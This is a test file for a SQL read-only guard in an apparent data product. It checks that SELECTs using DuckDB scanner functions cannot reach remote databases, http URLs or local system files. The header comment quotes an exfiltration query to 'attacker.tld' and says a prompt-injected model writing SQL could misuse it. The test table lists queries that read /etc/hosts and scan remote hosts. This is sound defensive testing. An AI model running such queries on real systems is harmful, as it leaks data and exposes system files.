import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { DEFAULT_DATASET_ID } from '@datera/core';
import {
  fixturePaths, openTestWorkspace, testPorts,
  type FixturePaths, type TestWorkspace,
} from '@datera/testkit';

/**
 * A SELECT cannot reach the network or the filesystem.
 *
 * The read-only guard allows exactly SELECT and EXPLAIN, which correctly refuses INSTALL,
 * LOAD, ATTACH and COPY. What it did not have was any view of *what a SELECT calls*. The
 * scanner extensions are loaded at startup, so
 *
 *   SELECT * FROM postgres_scan('host=attacker.tld …', 'public', 't')
 *
 * is a single bound SELECT: it passed the guard and opened an outbound connection. The
 * same shape reads arbitrary local files through sqlite_scan and read_csv.
 *
 * That matters most on the path this product is built around — a model writes the SQL. A
 * prompt-injected or simply confused model had an exfiltration primitive, and the egress
 * test could not see it, because that test patches Node's sockets and this happens inside
 * DuckDB's native addon.
 */
describe('a query cannot call its way out of the workspace', () => {
  let ws: TestWorkspace;
  let fixtures: FixturePaths;

  beforeEach(async () => {
    fixtures = fixturePaths(process.env['DATERA_FIXTURES'] as string);
    ws = await openTestWorkspace({ ports: testPorts() });
    await ws.datera.addSource({ type: 'file', path: fixtures.ordersCsv, name: 'orders' });
  });

  afterEach(async () => {
    await ws.dispose();
  });

  const refused = [
    ['a remote Postgres', `SELECT * FROM postgres_scan('host=example.invalid dbname=x user=y', 'public', 't')`],
    ['a remote MySQL', `SELECT * FROM mysql_scan('host=example.invalid', 'db', 't')`],
    ['an arbitrary SQLite file', `SELECT * FROM sqlite_scan('/etc/hosts', 'anything')`],
    ['an arbitrary local file', `SELECT * FROM read_csv('/etc/hosts')`],
    ['a file over http', `SELECT * FROM read_csv('https://example.invalid/x.csv')`],
    ['a directory glob', `SELECT * FROM read_csv('/etc/*')`],
  ] as const;

  for (const [what, sql] of refused) {
    it(`refuses to read ${what}`, async () => {
      await expect(ws.datera.query(DEFAULT_DATASET_ID, sql)).rejects.toThrow(
        /not allowed|refused|read-only|outside/i,
      );
    });
  }

  it('still runs an ordinary query against the dataset', async () => {
    // The guard has to refuse the reach without refusing the product.
    const result = await ws.datera.query(DEFAULT_DATASET_ID, 'SELECT count(*) AS n FROM orders');
    expect(Number(result.rows[0]?.[0])).toBeGreaterThan(0);
  });

  it('still allows ordinary scalar and aggregate functions', async () => {
    const result = await ws.datera.query(
      DEFAULT_DATASET_ID,
      `SELECT upper(product) AS p, sum(revenue_cents) AS total FROM orders GROUP BY product`,
    );
    expect(result.rows.length).toBeGreaterThan(0);
  });
});
